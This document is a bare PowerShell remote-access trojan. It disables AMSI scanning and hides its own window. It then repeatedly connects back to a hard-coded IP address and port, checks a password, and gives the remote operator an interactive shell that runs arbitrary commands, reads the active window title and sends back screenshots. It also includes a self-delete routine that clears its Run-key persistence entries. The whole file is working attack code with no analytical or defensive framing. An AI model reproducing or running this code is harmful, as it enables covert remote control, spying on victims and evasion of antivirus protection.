[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$ip = '192.168.12.204'; $port = 4444; $pass = "biskviti"
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$regNames = @("SysUpdate", "WinDiag") 
$scriptPath = "$env:TEMP\sysupd.ps1"

$api = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru
$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

function Master-Kill {
    foreach ($name in $regNames) { 
        Remove-ItemProperty -Path $regPath -Name $name -Force -ErrorAction SilentlyContinue 
    }
    $cmd = "/c start /min cmd /c `"taskkill /F /PID $PID & timeout /t 2 & del /f /q `"$scriptPath`" & exit`""
    Start-Process cmd.exe -ArgumentList $cmd -WindowStyle Hidden
    exit
}

while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient($ip, $port); 
        $s = $c.GetStream(); 
        $e = New-Object System.Text.UTF8Encoding
        
        $s.Write(($e.GetBytes("AUTH: ")), 0, 6)
        Start-Sleep 1
        
        [byte[]]$authB = New-Object byte[] 64
        $authB[0] = 0
        $len = $s.Read($authB, 0, 64)
        
        if ($len -gt 0) {
            $authResp = $e.GetString($authB, 0, $len).Trim()
            if ($authResp -ne $pass) {
                $s.Write(($e.GetBytes("AUTH FAIL`n")), 0, 10)
                $c.Close(); continue
            }
        }
        
        $s.Write(($e.GetBytes("AUTH OK`nPS " + $PWD + "> ")), 0, 20 + $PWD.Length)

        while($true) {
            [byte[]]$b = New-Object byte[] 4096
            $i = $s.Read($b, 0, $b.Length)
            if ($i -le 0) { break }
            
            $in = $e.GetString($b, 0, $i).Trim()
            
            if ($in -eq 'kill') { 
                Master-Kill 
            }
            elseif ($in -eq 'screen') {
                $handle = $api::GetForegroundWindow()
                $sb = New-Object System.Text.StringBuilder 256
                $api::GetWindowText($handle, $sb, $sb.Capacity)
                $out = "[WINDOW] " + $sb.ToString() + "`n"
            }
            elseif ($in -eq 'screenshot') {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
                    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object Drawing.Bitmap $sc.Width, $sc.Height
                    $g = [Drawing.Graphics]::FromImage($bmp)
                    $g.CopyFromScreen($sc.Location, [Drawing.Point]::Empty, $sc.Size)
                    $ms = New-Object IO.MemoryStream
                    $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
                    $out = [Convert]::ToBase64String($ms.ToArray()) + "`n"
                    $g.Dispose(); $bmp.Dispose(); $ms.Close()
                } catch { $out = "Screenshot failed`n" }
            }
            else {
                $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message }
            }
            
            $out = $out -replace "`r`n|\r", "`n"
            $prompt = "PS " + $PWD + "> "
            $resp = $e.GetBytes($out + $prompt)
            $s.Write($resp, 0, $resp.Length)
        }
        $c.Close()
    } 
    catch { Start-Sleep 5 }
}
